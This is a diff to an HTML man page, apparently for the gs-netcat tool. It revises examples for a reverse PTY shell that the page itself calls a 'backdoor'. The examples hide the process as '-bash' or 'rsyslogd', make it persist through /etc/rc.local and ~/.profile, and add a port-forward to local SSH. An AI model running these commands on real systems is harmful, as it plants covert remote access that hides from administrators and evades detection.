@@ -322,22 +322,25 @@ The sftp-server binary speaks the sftp-protocol to stdin/stdout. The sftp binary
 
 - Encrypted Reverse PTY shell hidden as '-bash' in the process list - also known as 'backdoor':
 
-<BLOCKQUOTE><TT>$ export GSOCKET_ARGS='-s MySecret -liqD'</TT></BLOCKQUOTE>
-
-<BLOCKQUOTE><TT>$ (exec -a -bash gs-netcat)</TT></BLOCKQUOTE>
+<BLOCKQUOTE><TT>$ (GSOCKET_ARGS=&quot;-s MySecret -liqD&quot; exec -a -bash gs-netcat)</TT></BLOCKQUOTE>
 <P>
 
 The following line in /etc/rc.local starts the backdoor after each system reboot:
 
-<BLOCKQUOTE><TT>(GSOCKET_ARGS=&quot;-s MySecret -liqD&quot; SHELL=&quot;/bin/bash&quot; exec -a rsyslogd /usr/local/bin/gs-netcat)</TT></BLOCKQUOTE>
+<BLOCKQUOTE><TT>GSOCKET_ARGS=&quot;-s MySecret -liqD&quot; HOME=/root TERM=xterm-256color SHELL=&quot;/bin/bash&quot; /bin/bash -c&nbsp;&quot;cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat&quot;</TT></BLOCKQUOTE>
+<P>
+
+The follwing line in /etc/rc.local starts a port-forward to 127.0.0.1:22:
+
+<BLOCKQUOTE><TT>GSOCKET_ARGS=&quot;-k MySecret2 -lqD -d 127.1 -p22&quot;  /bin/bash -c&nbsp;&quot;exec -a rsyslogd /usr/local/bin/gs-netcat&quot;</TT></BLOCKQUOTE>
 <P>
 
 The following line in the user's ~/.profile starts the backdoor (once) when the user logs in. All in one line:
 
-<BLOCKQUOTE><TT>killall -0 gs-netcat 2&gt;/dev/null || (GSOCKET_ARGS=&quot;-s MySecret -liqD&quot; SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)</TT></BLOCKQUOTE>
+<BLOCKQUOTE><TT>killall -0 gs-netcat 2&gt;/dev/null || (GSOCKET_ARGS=&quot;-s MySecret3 -liqD&quot; SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)</TT></BLOCKQUOTE>
 <P>
 
-The '(...)' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as rsyslogd) from the process list. Set SHELL=/bin/bash to use bash instead of /bin/sh.
+The '(...)' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as -bash) from the process list.
 <P>
 
 Client to connect to the backdoor:
@@ -473,6 +476,6 @@ Efforts have been made to have
 This document was created by
 <A HREF="http://hackerschoice.github.io/">man2html</A>,
 using the manual pages.<BR>
-Time: 14:15:29 GMT, October 30, 2020
+Time: 12:32:27 GMT, November 04, 2020
 </BODY>
 </HTML>
